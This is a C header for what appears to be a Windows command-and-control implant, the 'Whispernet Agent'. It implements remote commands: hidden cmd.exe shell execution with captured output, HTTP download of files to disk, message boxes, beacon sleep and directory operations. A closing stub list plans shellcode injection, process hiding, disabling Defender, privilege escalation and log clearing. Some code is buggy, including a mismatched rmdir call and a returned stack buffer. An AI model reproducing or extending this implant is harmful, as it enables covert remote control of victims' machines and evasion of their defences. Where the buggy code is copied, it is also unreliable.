#pragma once

#include <stdio.h>
#include <windows.h>
#include "type_conversions.h"
#include "whisper_config.h"
#include "whisper_json.h"
#include "whisper_winapi.h"
#include "whisper_dynamic_config.h"


/*
    Baked in commands to Whispernet Agent

    uses things like whisper_winapi to do actions here


    may need to split into .c and .h as well
*/

void get_username(OutboundJsonDataStruct* response_struct);
int parse_command(char* command, char* args, OutboundJsonDataStruct*);
void shell(OutboundJsonDataStruct*, char* args);
void get_file_http(OutboundJsonDataStruct*, char* args);
void messagebox(OutboundJsonDataStruct*, char* args);
void sleep(OutboundJsonDataStruct*, char* args);
void help(OutboundJsonDataStruct*);

//filesystem stuff
void mkdir(OutboundJsonDataStruct* response_struct, char* args);
void rmdir_win(OutboundJsonDataStruct* response_struct, char* args);
void cd(OutboundJsonDataStruct* response_struct, char* args);
void pwd(OutboundJsonDataStruct* response_struct);

// ====================
// Functions
// ====================

// later - have a seperate parse tree based on if creds are supplied or not, or
// somethign like that...
int parse_command(char* command, char* args, OutboundJsonDataStruct* response_struct)
{
    if (!response_struct) {
        DEBUG_LOG("[!] response_struct is NULL!\n");
        return -1; // Error case
    }

    DEBUG_LOG("Struct UUID: %s\n",
        response_struct->agent_id); // Correct: Use -> for pointers
    DEBUG_LOG("Struct command_result_data: %s\n", response_struct->command_result_data);

    // cant use switch cuz char * is not a single value (intergral type)

    if (strcmp(command, "whoami") == 0) {
        DEBUG_LOG("[COMMAND] whoami\n");
        get_username(response_struct);
    } 
    else if (strcmp(command, "shell") == 0) {
        DEBUG_LOG("[COMMAND] shell\n");
        shell(response_struct, args);
    } 
    else if (strcmp(command, "get_http") == 0) {
        DEBUG_LOG("[COMMAND] get_http...\n");
        get_file_http(response_struct, args);
    } 
    else if (strcmp(command, "messagebox") == 0) {
        DEBUG_LOG("[COMMAND] get_http...\n");
        messagebox(response_struct, args);
    } 
    else if (strcmp(command, "help") == 0) {
        DEBUG_LOG("[COMMAND] help...\n");
        help(response_struct);
    } 
    else if (strcmp(command, "sleep") == 0) {
        DEBUG_LOG("[COMMAND] sleep\n");
        sleep(response_struct, args);
    } 
    else if (strcmp(command, "mkdir") == 0) {
        DEBUG_LOG("[COMMAND] mkdir\n");
        mkdir(response_struct, args);
    }
    else if (strcmp(command, "cd") == 0) {
        DEBUG_LOG("[COMMAND] cd\n");
        cd(response_struct, args);
    }
    else if (strcmp(command, "rmdir") == 0) {
        DEBUG_LOG("[COMMAND] rmdir\n");
        rmdir(response_struct, args);
    }
    else if (strcmp(command, "pwd") == 0) {
        DEBUG_LOG("[COMMAND] pwd\n");
        pwd(response_struct);
    }
    else {
        DEBUG_LOG("[COMMAND] Unknown command!\n");
        response_struct->command_result_data = "Unknown command";
    }
    return 0;
}
// ====================
// Commands
// ====================

// Keep
void get_username(OutboundJsonDataStruct* response_struct)
{
    /*
        Command: whoami, or username, etc.
        No parsing needed for this command

    */
    static WCHAR username[256]; // Static to persist after function returns
    DWORD size = 256;

    if (WhisperGetUserNameW(username, &size)) {
        DEBUG_LOGW(L"Current User: %s\n", username);

        // Convert WCHAR* to UTF-8 char*
        char* utf8_username = wchar_to_utf8(username);
        if (utf8_username) {
            // free previous command_result_data (if any) to prevent memory leak, otherwise the
            // previous command_result_data here could be left in memory (dangling pointer cuz we
            // lose the pointer if there was anythign there)
            free(response_struct->command_result_data);

            // Assign new UTF-8 string to response_struct->command_result_data
            response_struct->command_result_data = utf8_username;
        }
    } else {
        DEBUG_LOGW(L"Failed to get username. Error: %lu\n", GetLastError());
    }
}

// Keep
void start_process(OutboundJsonDataStruct* response_struct) { };
/*
    Command: start-process some.exe or execute
    need to split/remove start-process from command, then call
   WhisperStartProcess[A/W] desc: starts a process/exe.

*/

// Keep
void get_file_http(OutboundJsonDataStruct* response_struct, char* args)
{
    /*

    Command:
        get_http http://someexample.com/file.exe C:\myfile.exe

    */

    char* context = NULL; // Required for strtok_s & thread safety.
    char* url = strtok_s(args, " ", &context);
    char* file_path = strtok_s(NULL, " ", &context);

    if (url == NULL || file_path == NULL) {
        DEBUG_LOGF(stderr, "Invalid arguments. Expected: <URL> <FilePath>\n");
        // put message in response struct abuot invalid args
        response_struct->command_result_data = "Invalid arguments. Expected: <URL> <FilePath>"; // fine to do this
                                                                                 // like this as it's
                                                                                 // read only.
        return;
    }

    DEBUG_LOG("URL: %s\n", url);
    DEBUG_LOG("File Path: %s\n", file_path);

    if (download_file(url, file_path) == 1) {
        DEBUG_LOG("Something went wrong downloading the file");
        // put error message in response struct
        // fine to do this like this as it's read only.
        response_struct->command_result_data = "Something went wrong downloading the file";
        return;
    }

    // fine to do this like this as it's read only.
    response_struct->command_result_data = "Successfuly downloaded file";
}

// Keep
void shell(OutboundJsonDataStruct* response_struct, char* args)
{
    /*
        Command: shell somecommand
        need to split/remove start-process from command, then call
       WhisperStartProcess[A/W] with cmd.exe desc: runs a shell command. PROLLY
       NOT OPSEC SAFE.

    */

    // ====================
    // INIT stuff
    // ====================
    DEBUG_LOG("ARGS: %s \n", args);
    SECURITY_ATTRIBUTES sa;
    HANDLE hRead, hWrite;
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    char buffer_PIPE_READ_SIZE_BUFFER[PIPE_READ_SIZE_BUFFER];
    DWORD bytesRead;
    BOOL success;
    // char command[] = "echo Hello, World!";

    // Set up the security attributes struct to allow pipe handles to be inherited
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    // ====================
    // Create Pipe for output
    // ====================
    // Create an anonymous pipe for the child process's STDOUT
    if (!WhisperCreatePipe(&hRead, &hWrite, &sa, 0)) {
        DEBUG_LOGF(stderr, "CreatePipe failed (%lu)\n", GetLastError());
    }
    // Ensure the read handle to the pipe is not inherited
    WhisperSetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    // ====================
    // Create Child Process
    // ====================
    // Set up the STARTUPINFO structure
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdOutput = hWrite;
    si.hStdError = hWrite; // Redirect STDERR as well
    si.dwFlags |= STARTF_USESTDHANDLES;

    // Set up the command line
    char cmdLine[CLI_INPUT_SIZE_BUFFER];
    snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /C \"%s\"", args);

    ZeroMemory(&pi, sizeof(pi));
    success = WhisperCreateProcessA(NULL, cmdLine, NULL, NULL,
        TRUE, // Inherit handles
        CREATE_NO_WINDOW, //hides terminal from popping up
        NULL,
        PROCESS_SPAWN_DIRECTORY, // init dir
        &si, &pi);

    if (!success) {
        DEBUG_LOGF(stderr, "[!] CreateProcess failed (%lu)\n", GetLastError());
        WhisperCloseHandle(hWrite);
        WhisperCloseHandle(hRead);
    }

    // Wait for the child process to finish
    // wait for the process to finsih writing to pipe, OTHERWISE, you'll get weird
    // pipe/NULL outputs
    DEBUG_LOG("[+] Waiting for child process to finish (/write to pipe)...");
    WhisperWaitForSingleObject(pi.hProcess, INFINITE);

    // Close the write end of the pipe in the parent process, once the child is
    // done.
    WhisperCloseHandle(hWrite);

    // ====================
    // Read Pipe
    // ====================

    // Read the output from the child process in chunks. Reads until nothign left
    // in pipe
    DWORD totalBytesRead = 0;
    while (TRUE) {
        success = WhisperReadFile(hRead, buffer_PIPE_READ_SIZE_BUFFER, sizeof(buffer_PIPE_READ_SIZE_BUFFER) - 1,
            &bytesRead, NULL);
        if (!success || bytesRead == 0) {
            break; // No more command_result_data to read or read failed
        }

        buffer_PIPE_READ_SIZE_BUFFER[bytesRead] = '\0'; // Null-terminate the string
        DEBUG_LOG("%s", buffer_PIPE_READ_SIZE_BUFFER);
        totalBytesRead += bytesRead;
    }

    // ====================
    // Generate Response
    // ====================

    // put into struct
    free(response_struct->command_result_data);
    // Assign new UTF-8 string to response_struct->command_result_data
    response_struct->command_result_data = buffer_PIPE_READ_SIZE_BUFFER;

    // ====================
    // Cleanup
    // ====================
    WhisperCloseHandle(pi.hProcess);
    WhisperCloseHandle(pi.hThread);
    WhisperCloseHandle(hRead);
}

// Keep
void messagebox(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL; // Required for strtok_s & thread safety.
    char* title = strtok_s(args, " ", &context);
    char* message = strtok_s(NULL, " ", &context);

    // Ensure both title and message are not NULL
    if (!title || !message) {
        DEBUG_LOG("[ERROR] messagebox: Expected: <URL> <FilePath>\n");
        return;
    }

    // Call the WhisperMessageBoxA function
    WhisperMessageBoxA(NULL, message, title, MB_OK | MB_ICONINFORMATION);
    response_struct->command_result_data = "Message box popped successfully";
}

// Keep
void sleep(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL; // Required for strtok_s & thread safety.
    char* sleep_arg = strtok_s(args, " ", &context);
    //char* jitter = strtok_s(NULL, " ", &context);

    if (!sleep_arg) {
        DEBUG_LOG("[ERROR] sleep: Expected: sleep\n");
        return;
    }

    //shitty int check
    if (scanf("%d", &sleep_arg) == 0) {
        DEBUG_LOG("[ERROR] messagebox: Expected: <URL> <FilePath>\n");
        response_struct->command_result_data = "[ERROR] sleep: Expected: <int: sleeptime (seconds)>";
        return;
    }

    // If your function wants the value in **seconds**,
// you can either store seconds directly or convert to milliseconds:
    DWORD dwTime = (DWORD)sleep_arg;  // or (DWORD)(seconds * 1000) if needed in ms

    set_sleep_time(dwTime);
    response_struct->command_result_data = "Sleep set successfully";
    return;
}

// Keep
void help(OutboundJsonDataStruct* response_struct)
{
    const char* help_string = "Help:\n\
> Loud Commands\n\
	http_get: (http_get <str: url> <str: filepath>): Get an HTTP file, and save at the <filpath>\n\
		[ OPSEC: Will write file to disk ]\n\
	shell: (shell <str: command>): Run a command via cmd.exe\n\
		[ OPSEC: Runs a new cmd.exe process ]\n\
	messagebox: (messagebox <str: title> <str: message>): Pop a messagebox with a message\n\
		[ OPSEC: Shows on users screen ]\n\
> Config Commands:\n\
    sleep: (sleep <int: sleeptime (seconds)): How long to sleep for/update sleep time\n\
";

    response_struct->command_result_data = help_string;
    return;
}


/*
Directory Commands

Need to switch to WhisperFunctions

Still need some work

*/



/* 
    Create a directory 
*/
void mkdir(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL; // Required for strtok_s & thread safety.
    char* path_arg = strtok_s(args, " ", &context);

    if (CreateDirectoryA(path_arg, NULL)) {
        DEBUG_LOG("Directory created: %s\n", path_arg);
    } else {
        DEBUG_LOG("CreateDirectory failed. Error: %lu\n", GetLastError());
    }
}

/* 
    Remove a directory 
*/
void rmdir_win(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL; // Required for strtok_s & thread safety.
    char* path_arg = strtok_s(args, " ", &context);

    if (RemoveDirectoryA(path_arg)) {
        DEBUG_LOG("Directory removed: %s\n", path_arg);
        response_struct->command_result_data = "Directory removed";

    } else {
        DEBUG_LOG("RemoveDirectory failed. Error: %lu\n", GetLastError());
        response_struct->command_result_data = "Directory removal failed";

    }
}

/* 
    Change directory 
*/
void cd(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL; // Required for strtok_s & thread safety.
    char* path_arg = strtok_s(args, " ", &context);
    
    if (SetCurrentDirectoryA(path_arg)) {
        DEBUG_LOG("Changed directory to: %s\n", path_arg);

        //could have a better response here, like "Current path is: path"
        response_struct->command_result_data = path_arg;

    } else {
        DEBUG_LOG("SetCurrentDirectory failed. Error: %lu\n", GetLastError());
        response_struct->command_result_data = "SetCurrentDirectory failed";

    }
}

/* 
    Get current working directory 
*/
void pwd(OutboundJsonDataStruct* response_struct) {
    char cwd[MAX_PATH];
    if (GetCurrentDirectoryA(MAX_PATH, cwd)) {
        DEBUG_LOG("Current working directory: %s\n", cwd);
        //not returning full dir, might have to allocate some stuff for it?
        response_struct->command_result_data = cwd;

    } else {
        DEBUG_LOG("GetCurrentDirectory failed. Error: %lu\n", GetLastError());
        response_struct->command_result_data = "GetCurrentDirectory failed";

    }
}


/*
 Stub commands for things that can to be added for more functionality

*/

// File Operations
// void write_file(response_struct, path, contents) - Write contents to a file
// void read_file(response_struct, path) - Read contents of a file
// void delete_file(response_struct, path) - Delete a file
// void append_file(response_struct, path, contents) - Append data to an existing file
// void rename_file(response_struct, old_path, new_path) - Rename or move a file
// void copy_file(response_struct, src, dest) - Copy a file from one location to another
// void download_file(response_struct, url, dest) - Download a file from a URL
// void upload_file(response_struct, src, dest) - Upload a file to the C2
// void search_file(response_struct, dir, pattern) - Search for files matching a wildcard pattern

// Directory Operations
// [X] void mkdir(response_struct, path) - Create a directory
// [X] void rmdir(response_struct, path) - Remove a directory
// [X] void cd(response_struct, path) - Change directory
// [X] void pwd(response_struct) - Get current working directory
// void ls(response_struct, path) - List files in a directory

// Process and Execution
// void start_process(response_struct, command) - Start a new process
// void kill_process(response_struct, pid) - Kill a process by PID
// void suspend_process(response_struct, pid) - Suspend a process
// void resume_process(response_struct, pid) - Resume a suspended process
// void shell(response_struct, command) - Execute a shell command and return output

// System Information
// void get_username(response_struct) - Get the current username
// void get_system_info(response_struct) - Retrieve system information
// void get_os_version(response_struct) - Get OS version details
// void get_ip(response_struct) - Retrieve the system’s IP address
// void get_env_vars(response_struct) - Get a list of environment variables

// Network Operations
// void get_file_http(response_struct, url) - Fetch a file over HTTP
// void upload_file_http(response_struct, src, url) - Upload a file via HTTP POST
// void ping(response_struct, target) - Send a ping to a target host
// void port_scan(response_struct, target, start_port, end_port) - Scan open ports on a target

// C2 Interaction
// void sleep(response_struct, seconds) - Pause execution for a given time
// void checkin(response_struct) - Send a beacon/check-in message to C2
// void change_c2_server(response_struct, new_address) - Update the C2 server address

// Stealth & Evasion
// void inject_shellcode(response_struct, pid, shellcode) - Inject shellcode into a process
// void hide_process(response_struct, pid) - Attempt to hide a running process
// void disable_defender(response_struct) - Try to disable Windows Defender
// void elevate_privileges(response_struct) - Attempt to escalate privileges
// void clear_logs(response_struct) - Clear system logs for stealth
// void disable_event_logging(response_struct) - Disable Windows event logging


